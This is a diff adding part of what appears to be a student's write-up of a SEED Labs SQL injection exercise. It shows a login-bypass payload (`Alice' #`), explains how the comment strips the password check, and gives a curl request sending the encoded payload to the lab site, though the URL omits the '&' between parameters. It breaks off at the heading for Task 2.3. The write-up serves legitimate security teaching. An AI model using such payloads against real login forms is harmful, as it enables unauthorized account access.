@@ -76,3 +76,42 @@ select * from credential where Name='Alice';
 ---
 ## Task 2: SQL Injection Attack on *SELECT* Statement:
 
+### Task 2.1: SQL Injection Attack from webpage.
+- Username: `Alice' #`
+- Password: Whatever you want, leave it empty even...
+
+    It's like using a SQL query like this:
+    ```sql
+    select *
+    from credential
+    where name= 'Alice' #' and password='whatever';
+    ```
+    ```sql
+    --it should be something like this normally:
+    where name= 'Alice' and password='alice-passwd';
+    ```
+
+    `#` is used to begin a comment in MySQL. Everything following the `#` is ignored by the query. So, we deleted the `and` condition, and the query now only checks for a match on the `name` field, allowing attackers to log in as Alice regardless of the password.
+
+---
+### Task 2.2: SQL Injection Attack from command line.
+The same as Task 2.1, but without using the webpage.
+- Using the command `curl`: which can send HTTP GET requests.
+- If you want to include multiple parameters (*username*, *password*) in HTTP requests, you need to put the URL and the parameters between a pair of single quotes.
+
+    ```bash
+    # sending an HTTP GET request
+    $ curl 'http://www.seedlabsqlinjection.com/unsafe_home.php?username=Alice%27%20%23Password=whatever'
+
+    # so it's like
+    username= Alice' #
+    password= whatever
+    ```
+    Special characters are encoded:
+    - `%27` = single quote
+    - `%20` = space
+    - `%23` = hashtag #
+
+- Then, export the html output into a `file.html` and open it. It contains all information we need but lacks the layout controls by a specified `CSS` file.
+---
+### Task 2.3: Append a new SQL statement.
